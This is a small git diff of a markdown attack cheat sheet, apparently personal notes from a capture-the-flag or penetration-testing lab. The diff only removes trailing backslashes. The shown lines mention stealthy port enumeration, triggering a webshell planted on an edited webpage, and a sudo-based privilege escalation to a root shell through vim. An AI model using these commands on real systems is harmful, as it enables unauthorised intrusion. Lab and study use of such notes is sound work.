@@ -1,5 +1,5 @@
 # List of useful commands
-This list contains useful commands to use during the attack\
+This list contains useful commands to use during the attack
 
 # Port enumeration
 Enumerates all the open ports in a stealthier way\
@@ -24,7 +24,7 @@ Go to the edited webpage to trigger the webshell
 
 # Privilege Escalation
 First, let's enumerate all what are the sudo rights given to www-data\
-`sudo -l`\
+`sudo -l`
 \
 privilege escalation (gtfobins)\
 `sudo vim -c ':!/bin/sh'`\
